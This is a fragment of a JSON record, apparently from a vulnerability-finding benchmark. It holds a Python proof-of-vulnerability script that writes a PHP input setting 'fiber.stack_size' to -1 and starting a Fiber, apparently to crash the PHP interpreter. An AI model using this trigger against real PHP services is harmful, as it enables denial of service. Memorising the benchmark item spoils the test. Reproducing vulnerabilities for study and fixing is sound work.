    "decoding": "<pov_script>\n\n# Use embedded PoC data\npoc_data = b'<?$callback=function(){};ini_set(\"fiber.stack_size\",\"-1\");$fiber=new Fiber($callback);try{$fiber->start();}catch(\\xff){}'\n\nwith open(\"input.bin\", \"wb\") as f:\n    f.write(poc_data)\n\n</pov_script>\n",
